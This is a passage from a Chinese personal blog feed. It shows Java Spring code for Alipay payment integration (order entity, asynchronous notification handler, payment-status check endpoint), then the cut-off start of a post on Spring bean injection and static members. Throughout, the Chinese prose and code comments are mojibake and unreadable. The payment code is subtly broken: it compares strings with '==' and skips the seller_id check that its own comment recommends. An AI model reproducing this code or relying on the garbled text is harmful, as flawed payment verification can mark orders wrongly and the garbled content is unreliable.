è®¢å•ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> orderId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¢å•å·</span></span><br><span class="line">    <span class="keyword">private</span> String outTradeNo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡‘é¢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> amount;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// äº¤æ˜“çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tradeStatus;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šçŸ¥æ—¶é—´</span></span><br><span class="line">    <span class="keyword">private</span> String notifyTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¢å•ç”Ÿæˆæ—¶é—´</span></span><br><span class="line">    <span class="keyword">private</span> String createTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»˜æ¬¾æ—¶é—´</span></span><br><span class="line">    <span class="keyword">private</span> String payTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€€æ¬¾æ—¶é—´</span></span><br><span class="line">    <span class="keyword">private</span> String refundTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¢å•ç»“æŸæ—¶é—´</span></span><br><span class="line">    <span class="keyword">private</span> String closeTime;</span><br><span class="line">  </span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ response.getBody() å°±æ˜¯åŠ å¯†åçš„è®¢å•å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥è¿”å›ç»™ App ç«¯è¿›è¡Œä½¿ç”¨ã€‚</p><h3 id="æ¥å£-2ï¼šæ”¯ä»˜å®æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥"><a href="#æ¥å£-2ï¼šæ”¯ä»˜å®æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥" class="headerlink" title="æ¥å£ 2ï¼šæ”¯ä»˜å®æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥"></a>æ¥å£ 2ï¼šæ”¯ä»˜å®æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥</h3><p><strong>åŠŸèƒ½</strong></p><ul><li><p>é€šè¿‡å¼‚æ­¥é€šçŸ¥æ›´æ–°æ”¯ä»˜å®è®¢å•ä¿¡æ¯ã€‚</p></li><li><p>é˜²æ­¢è®¢å•ä¸¢å¤±ï¼Œå³é¡µé¢è·³è½¬åŒæ­¥é€šçŸ¥æ²¡æœ‰å¤„ç†è®¢å•æ›´æ–°ï¼Œå®ƒåˆ™å»å¤„ç†ã€‚</p></li></ul><p><strong>æ³¨æ„</strong></p><ul><li>åªæœ‰åœ¨æ”¯ä»˜å®çš„äº¤æ˜“ç®¡ç†ä¸­å­˜åœ¨è¯¥ç¬”äº¤æ˜“ï¼Œä¸”å‘ç”Ÿäº†äº¤æ˜“çŠ¶æ€çš„æ”¹å˜ï¼Œæ”¯ä»˜å®æ‰ä¼šé€šè¿‡è¯¥æ–¹å¼å‘èµ·æœåŠ¡å™¨é€šçŸ¥ã€‚</li><li>ç¬¬ä¸€æ¬¡äº¤æ˜“çŠ¶æ€æ”¹å˜ï¼ˆå³æ—¶åˆ°è´¦ä¸­æ­¤æ—¶äº¤æ˜“çŠ¶æ€æ˜¯äº¤æ˜“å®Œæˆï¼‰æ—¶ï¼Œä¸ä»…ä¼šè¿”å›åŒæ­¥å¤„ç†ç»“æœï¼Œè€Œä¸”æœåŠ¡å™¨å¼‚æ­¥é€šçŸ¥é¡µé¢ä¹Ÿä¼šæ”¶åˆ°æ”¯ä»˜å®å‘æ¥çš„å¤„ç†ç»“æœé€šçŸ¥ã€‚</li></ul><p><strong>ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/asyn"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getAsynResult</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> AlipayApiException </span>&#123;</span><br><span class="line">  <span class="comment">//è·å–æ”¯ä»˜å®POSTè¿‡æ¥åé¦ˆä¿¡æ¯</span></span><br><span class="line">  Map&lt;String,String&gt; params = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">  Map requestParams = request.getParameterMap();</span><br><span class="line">  <span class="keyword">for</span> (Iterator iter = requestParams.keySet().iterator(); iter.hasNext();) &#123;</span><br><span class="line">    String name = (String) iter.next();</span><br><span class="line">    String[] values = (String[]) requestParams.get(name);</span><br><span class="line">    String valueStr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">      valueStr = (i == values.length - <span class="number">1</span>) ? valueStr + values[i]</span><br><span class="line">        : valueStr + values[i] + <span class="string">","</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä¹±ç è§£å†³ï¼Œè¿™æ®µä»£ç åœ¨å‡ºç°ä¹±ç æ—¶ä½¿ç”¨ã€‚</span></span><br><span class="line">    <span class="comment">//valueStr = new String(valueStr.getBytes("ISO-8859-1"), "utf-8");</span></span><br><span class="line">    params.put(name, valueStr);</span><br><span class="line">    logger.info(name+<span class="string">" "</span>+valueStr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//åˆ‡è®°alipaypublickeyæ˜¯æ”¯ä»˜å®çš„å…¬é’¥ï¼Œè¯·å»open.alipay.comå¯¹åº”åº”ç”¨ä¸‹æŸ¥çœ‹ã€‚</span></span><br><span class="line">  <span class="comment">//boolean AlipaySignature.rsaCertCheckV1(Map&lt;String, String&gt; params, String publicKeyCertPath, String charset,String signType)</span></span><br><span class="line">  <span class="comment">//è°ƒç”¨SDKéªŒè¯ç­¾å</span></span><br><span class="line">  <span class="keyword">boolean</span> flag = AlipaySignature.rsaCertCheckV1(params, alipayPublicCertPath, <span class="string">"UTF-8"</span>,<span class="string">"RSA2"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    <span class="comment">//è·å–å•†æˆ·ä¹‹å‰ä¼ ç»™æ”¯ä»˜å®çš„è®¢å•å·ï¼ˆå•†æˆ·ç³»ç»Ÿçš„å”¯ä¸€è®¢å•å·ï¼‰</span></span><br><span class="line">    String outTradeNo = params.get(<span class="string">"out_trade_no"</span>);</span><br><span class="line">    <span class="comment">//è®¢å•é‡‘é¢:æœ¬æ¬¡äº¤æ˜“æ”¯ä»˜çš„è®¢å•é‡‘é¢ï¼Œå•ä½ä¸ºäººæ°‘å¸ï¼ˆå…ƒï¼‰</span></span><br><span class="line">    String totalAmount=params.get(<span class="string">"total_amount"</span>);</span><br><span class="line">    <span class="comment">//å–å®¶æ”¯ä»˜å®ç”¨æˆ·å·</span></span><br><span class="line">    String sellerId=params.get(<span class="string">"seller_id"</span>);</span><br><span class="line">    <span class="comment">//æ”¯ä»˜å®åˆ†é…ç»™å¼€å‘è€…çš„åº”ç”¨Id</span></span><br><span class="line">    String appId=params.get(<span class="string">"app_id"</span>);</span><br><span class="line">    <span class="comment">//è·å–äº¤æ˜“çŠ¶æ€</span></span><br><span class="line">    String tradeStatus = params.get(<span class="string">"trade_status"</span>);</span><br><span class="line">    <span class="comment">//é€šçŸ¥æ—¶é—´:yyyy-MM-dd HH:mm:ss</span></span><br><span class="line">    String notifyTime=params.get(<span class="string">"notify_time"</span>);</span><br><span class="line">    <span class="comment">//äº¤æ˜“åˆ›å»ºæ—¶é—´:yyyy-MM-dd HH:mm:ss</span></span><br><span class="line">    String gmtCreate=params.get(<span class="string">"gmt_create"</span>);</span><br><span class="line">    <span class="comment">//äº¤æ˜“ä»˜æ¬¾æ—¶é—´</span></span><br><span class="line">    String gmtPayment=params.get(<span class="string">"gmt_payment"</span>);</span><br><span class="line">    <span class="comment">//äº¤æ˜“é€€æ¬¾æ—¶é—´</span></span><br><span class="line">    String gmtRefund=params.get(<span class="string">"gmt_refund"</span>);</span><br><span class="line">    <span class="comment">//äº¤æ˜“ç»“æŸæ—¶é—´</span></span><br><span class="line">    String gmtClose=params.get(<span class="string">"gmt_close"</span>);</span><br><span class="line"></span><br><span class="line">    AlipaymentOrder alipaymentOrder = alipaymentOrderService.selectAlipaymentOrder(outTradeNo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ”¯ä»˜å®å®˜æ–¹å»ºè®®æ ¡éªŒçš„å€¼ï¼ˆout_trade_noã€total_amountã€sellerIdã€app_idï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (alipaymentOrder != <span class="keyword">null</span> &amp;&amp; totalAmount.equals(String.valueOf(alipaymentOrder.getAmount())) &amp;&amp; app_id.equals(appId)) &#123;</span><br><span class="line">      <span class="comment">// æ›´æ–°æ—¶é—´ç›¸å…³çš„å€¼</span></span><br><span class="line">      alipaymentOrder.setNotifyTime(notifyTime);</span><br><span class="line">      alipaymentOrder.setCreateTime(gmtCreate);</span><br><span class="line">      alipaymentOrder.setPayTime(gmtPayment);</span><br><span class="line">      alipaymentOrder.setRefundTime(gmtRefund);</span><br><span class="line">      alipaymentOrder.setCloseTime(gmtClose);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// åˆ¤æ–­äº¤æ˜“ç»“æœ</span></span><br><span class="line">      <span class="keyword">switch</span> (tradeStatus)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_FINISHED"</span>: <span class="comment">// äº¤æ˜“ç»“æŸå¹¶ä¸å¯é€€æ¬¾</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">3</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_SUCCESS"</span>: <span class="comment">// äº¤æ˜“æ”¯ä»˜æˆåŠŸ</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">2</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_CLOSED"</span>: <span class="comment">// æœªä»˜æ¬¾äº¤æ˜“è¶…æ—¶å…³é—­æˆ–æ”¯ä»˜å®Œæˆåå…¨é¢é€€æ¬¾</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"WAIT_BUYER_PAY"</span>: <span class="comment">// äº¤æ˜“åˆ›å»ºå¹¶ç­‰å¾…ä¹°å®¶ä»˜æ¬¾</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      alipaymentOrderService.updateAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (tradeStatus.equals(<span class="string">"TRADE_SUCCESS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//                return AjaxResult.success("éªŒè¯ç­¾åæˆåŠŸä½†è®¢å•æœªæˆåŠŸæ”¯ä»˜");</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//            return AjaxResult.error("æ”¯ä»˜å®å®˜æ–¹å»ºè®®æ ¡éªŒçš„å€¼ï¼ˆout_trade_noã€total_amountã€sellerIdã€app_idï¼‰ä¸ä¸€è‡´ï¼");</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//        return AjaxResult.error("éªŒè¯ç­¾åå¤±è´¥ï¼");</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æŒ‰ç…§æ”¯ä»˜å®è¦æ±‚ï¼Œè¿”å›çš„å¿…é¡»æ˜¯å­—ç¬¦ä¸² â€œsuccessâ€ æˆ– â€œfailâ€ã€‚</p><h3 id="æ¥å£-3ï¼šæœ€ç»ˆä»˜æ¬¾æ ¡éªŒ"><a href="#æ¥å£-3ï¼šæœ€ç»ˆä»˜æ¬¾æ ¡éªŒ" class="headerlink" title="æ¥å£ 3ï¼šæœ€ç»ˆä»˜æ¬¾æ ¡éªŒ"></a>æ¥å£ 3ï¼šæœ€ç»ˆä»˜æ¬¾æ ¡éªŒ</h3><p><strong>åŠŸèƒ½</strong></p><p>æœ€ç»ˆæ”¯ä»˜ç»“æœå¿…é¡»é€šè¿‡è¿™ä¸ªæ¥å£è¿›è¡Œæ ¡éªŒã€‚</p><p><strong>ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/check"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> AjaxResult <span class="title">check</span><span class="params">(@RequestParam String outTradeNo)</span> <span class="keyword">throws</span> AlipayApiException, ParseException </span>&#123;</span><br><span class="line">    <span class="comment">//æ„é€ client</span></span><br><span class="line">    CertAlipayRequest certAlipayRequest = <span class="keyword">new</span> CertAlipayRequest();</span><br><span class="line">    <span class="comment">//è®¾ç½®ç½‘å…³åœ°å€</span></span><br><span class="line">    certAlipayRequest.setServerUrl(<span class="string">"https://openapi.alipay.com/gateway.do"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®åº”ç”¨Id</span></span><br><span class="line">    certAlipayRequest.setAppId(app_id);</span><br><span class="line">    <span class="comment">//è®¾ç½®åº”ç”¨ç§é’¥</span></span><br><span class="line">    certAlipayRequest.setPrivateKey(privateKey);</span><br><span class="line">    <span class="comment">//è®¾ç½®è¯·æ±‚æ ¼å¼ï¼Œå›ºå®šå€¼json</span></span><br><span class="line">    certAlipayRequest.setFormat(<span class="string">"json"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®å­—ç¬¦é›†</span></span><br><span class="line">    certAlipayRequest.setCharset(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®ç­¾åç±»å‹</span></span><br><span class="line">    certAlipayRequest.setSignType(<span class="string">"RSA2"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®åº”ç”¨å…¬é’¥è¯ä¹¦è·¯å¾„</span></span><br><span class="line">    certAlipayRequest.setCertPath(certPath);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ”¯ä»˜å®å…¬é’¥è¯ä¹¦è·¯å¾„</span></span><br><span class="line">    certAlipayRequest.setAlipayPublicCertPath(alipayPublicCertPath);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ”¯ä»˜å®æ ¹è¯ä¹¦è·¯å¾„</span></span><br><span class="line">    certAlipayRequest.setRootCertPath(rootCertPath);</span><br><span class="line">    <span class="comment">//æ„é€ client</span></span><br><span class="line">    AlipayClient alipayClient = <span class="keyword">new</span> DefaultAlipayClient(certAlipayRequest);</span><br><span class="line"></span><br><span class="line">    AlipayTradeQueryRequest alipayTradeQueryRequest = <span class="keyword">new</span> AlipayTradeQueryRequest();</span><br><span class="line">    alipayTradeQueryRequest.setBizContent(<span class="string">"&#123;"</span> +</span><br><span class="line">            <span class="string">"\"out_trade_no\":\""</span>+outTradeNo+<span class="string">"\""</span> +</span><br><span class="line">            <span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    AlipayTradeQueryResponse alipayTradeQueryResponse = alipayClient.certificateExecute(alipayTradeQueryRequest);</span><br><span class="line">    <span class="keyword">if</span>(alipayTradeQueryResponse.isSuccess())&#123;</span><br><span class="line">        AlipaymentOrder alipaymentOrder=alipaymentOrderService.selectAlipaymentOrder(outTradeNo);</span><br><span class="line">        EOrder eOrder=eOrderService.selectEOrderByOrderSn(outTradeNo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¿®æ”¹æ•°æ®åº“æ”¯ä»˜å®è®¢å•è¡¨</span></span><br><span class="line">        alipaymentOrder.setAmount(Double.parseDouble(alipayTradeQueryResponse.getTotalAmount()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­äº¤æ˜“ç»“æœ</span></span><br><span class="line">        <span class="keyword">switch</span> (alipayTradeQueryResponse.getTradeStatus())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_FINISHED"</span>: <span class="comment">// äº¤æ˜“ç»“æŸå¹¶ä¸å¯é€€æ¬¾</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">3</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_SUCCESS"</span>: <span class="comment">// äº¤æ˜“æ”¯ä»˜æˆåŠŸ</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_CLOSED"</span>: <span class="comment">// æœªä»˜æ¬¾äº¤æ˜“è¶…æ—¶å…³é—­æˆ–æ”¯ä»˜å®Œæˆåå…¨é¢é€€æ¬¾</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"WAIT_BUYER_PAY"</span>: <span class="comment">// äº¤æ˜“åˆ›å»ºå¹¶ç­‰å¾…ä¹°å®¶ä»˜æ¬¾</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        alipaymentOrderService.updateAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ”¯ä»˜æˆåŠŸï¼Œæ›´æ–°è®¢å•</span></span><br><span class="line">        <span class="keyword">if</span>(alipayTradeQueryResponse.getTradeStatus()==<span class="string">"TRADE_SUCCESS"</span>)&#123;</span><br><span class="line">            eOrder.setOrderStatus(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            String payTime=alipaymentOrder.getPayTime();</span><br><span class="line">            SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">            Date date=simpleDateFormat.parse(payTime);</span><br><span class="line">            eOrder.setPayTime(date);</span><br><span class="line"></span><br><span class="line">            eOrderMapper.updateEOrder(eOrder);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¿é™©è®¢å•</span></span><br><span class="line">            <span class="keyword">if</span> (eOrder.getOrderType() == <span class="number">1</span>) &#123;</span><br><span class="line">                EInsuranceOrder eInsuranceOrder=eInsuranceOrderMapper.selectEInsuranceOrderByOrderSn(outTradeNo);</span><br><span class="line">                eInsuranceOrder.setOrderStatus(<span class="number">1</span>);</span><br><span class="line">                eInsuranceOrder.setPayTime(date);</span><br><span class="line"></span><br><span class="line">                eInsuranceOrderMapper.updateEInsuranceOrder(eInsuranceOrder);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AjaxResult.success(alipaymentOrder);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">"è°ƒç”¨æ”¯ä»˜å®æŸ¥è¯¢æ¥å£å¤±è´¥ï¼"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ¥å£å¯ä»¥åŠ ä¸Šæ”¯ä»˜æˆåŠŸåçš„è®¢å•é€»è¾‘ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ç±»é€šè¿‡ç¬¬ä¸‰æ–¹æ¥å£è¿›è¡Œå¼€å‘çš„å·¥ä½œï¼ŒåŸºæœ¬æµç¨‹ä¹Ÿå°±æ˜¯ä¸Šè¿°è¿™æ ·ï¼Œä¸»è¦é—®é¢˜è¿˜æ˜¯å‡ºåœ¨å®˜æ–¹æ–‡æ¡£ä¸å®é™…æ“ä½œçš„ä¸ç¬¦ï¼Œè¿™å°±éœ€è¦ 1.ä»”ç»†é˜…è¯»å®˜æ–¹æ–‡æ¡£å’Œç†è§£ç¤ºä¾‹ä»£ç  2.å¤šæ‰“æ–­ç‚¹è°ƒè¯•å’Œçœ‹æ—¥å¿—çš„è¾“å‡ºæƒ…å†µã€‚</p><p>æ¯”è¾ƒé‡è¦çš„ç‚¹æ˜¯è¦å’Œè‡ªå·±é¡¹ç›®çš„ä¸šåŠ¡é€»è¾‘ç»“åˆï¼ŒçŸ¥é“è¯¥æŠŠè‡ªå·±çš„ä»£ç å®‰æ’åœ¨å“ªä¸ªä½ç½®ã€‚</p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p><a href="https://blog.csdn.net/Ouyzc/article/details/79551714" target="_blank" rel="noopener">https://blog.csdn.net/Ouyzc/article/details/79551714</a></p>]]></content>
        <author>
            <name><![CDATA[é£çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/07/15/blog10/</id>
        <title><![CDATA[Spring bean çš„å£°æ˜å’Œæ³¨å…¥]]></title>
        <updated>2020-08-25T07:09:07+08:00</updated>
        <link href="http://www.windboy.top/2020/07/15/blog10/"/>
        <content type="text/html" src="http://www.windboy.top/2020/07/15/blog10/"><![CDATA[<p>Spring bean å°±æ˜¯å¯é‡ç”¨ç»„ä»¶ï¼Œæ˜¯ Spring çš„åŸºç¡€ã€‚</p><p>é€šè¿‡ @Component æ³¨è§£å°†ä¸€ä¸ªç±»å£°æ˜ä¸º beanï¼Œäº¤ç»™ Spring ç®¡ç†ï¼Œå¹¶åœ¨éœ€è¦çš„æ—¶å€™æ³¨å…¥è·å–å®ä¾‹ã€‚è¿™å°±æ˜¯ Spring é‡è¦çš„ IOC åŠŸèƒ½ã€‚</p><p>ä»Šå¤©ç ”ç©¶çš„é—®é¢˜å‡ºç°åœ¨<strong><u>æ³¨å…¥</u></strong>è¿™ä¸€æ­¥ï¼šåœ¨å¯¹ä¸€ä¸ªå·¥å…·ç±»æ³¨å…¥ RedisCacheï¼ˆå°è£…äº† RedisTemplate çš„å·¥å…·ç±»ï¼‰ï¼Œç”±äºå·¥å…·ç±»ä½¿ç”¨äº†é™æ€æ–¹æ³•ï¼Œå¯¼è‡´æ— æ³•è·å–åˆ°æ³¨å…¥çš„ RedisCacheã€‚</p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>é¦–å…ˆæ¥è®¤è¯†ä¸€ä¸‹ static å¯ä»¥ä½œç”¨çš„å¯¹è±¡ï¼š</p><h4 id="é™æ€å˜é‡"><a href="#é™æ€å˜é‡" class="headerlink" title="é™æ€å˜é‡"></a>é™æ€å˜é‡</h4><p>åˆç§°ä¸ºç±»å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå˜é‡å±äºç±»çš„ï¼Œç±»æ‰€æœ‰çš„å®ä¾‹éƒ½å…±äº«é™æ€å˜é‡ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ç±»åæ¥è®¿é—®å®ƒã€‚é™æ€å˜é‡åœ¨å†…å­˜ä¸­åªå­˜åœ¨ä¸€ä»½ã€‚å½“ç±»è¢« Java è™šæ‹ŸæœºåŠ è½½çš„æ—¶å€™ï¼Œä¼šå¯¹ static å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚é™æ€å˜é‡å­˜æ”¾åœ¨ Java å†…å­˜åŒºåŸŸçš„æ–¹æ³•åŒºã€‚è€Œå®ä¾‹å˜é‡æ¯åˆ›å»ºä¸€ä¸ªå®ä¾‹å°±ä¼šäº§ç”Ÿä¸€ä¸ªï¼Œå®ƒä¸è¯¥å®ä¾‹åŒç”Ÿå…±æ­»ã€‚</p><h4 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h4><p>åœ¨ç±»åŠ è½½çš„æ—¶å€™å°±å­˜åœ¨äº†ï¼Œå®ƒä¸ä¾èµ–äºä»»ä½•å®ä¾‹ã€‚æ‰€ä»¥é™æ€æ–¹æ³•å¿…é¡»æœ‰å®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½æ˜¯æŠ½è±¡æ–¹æ³•ã€‚åªèƒ½è®¿é—®æ‰€å±ç±»çš„é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•ï¼ˆåˆå§‹åŒ–é¡ºåºï¼‰ï¼Œæ–¹æ³•ä¸­ä¸èƒ½æœ‰ this å’Œ super å…³é”®å­—ï¼ˆé™æ€ä¸éœ€è¦å¯¹è±¡ï¼‰ã€‚è°ƒç”¨é™æ€æ–¹æ³•å¯ä»¥æ— éœ€åˆ›å»ºå¯¹è±¡ï¼ˆå¦‚æœä½¿ç”¨å¯¹è±¡.é™æ€æ–¹æ³•ä¼šåœ¨ç¼–è¯‘åç¿»è¯‘ä¸ºç±».é™æ€æ–¹æ³•ï¼‰ã€‚å¦‚æœæ–¹æ³•æ‰§è¡Œçš„æ“ä½œä¸ä¾èµ–äºå…¶ç±»çš„å„ä¸ªå˜é‡å’Œæ–¹æ³•ï¼Œè®¾ç½®ä¸ºé™æ€ä½¿ç¨‹åºçš„å ç”¨ç©ºé—´æ›´å°ã€‚</p><h4 id="é™æ€è¯­å¥å—"><a 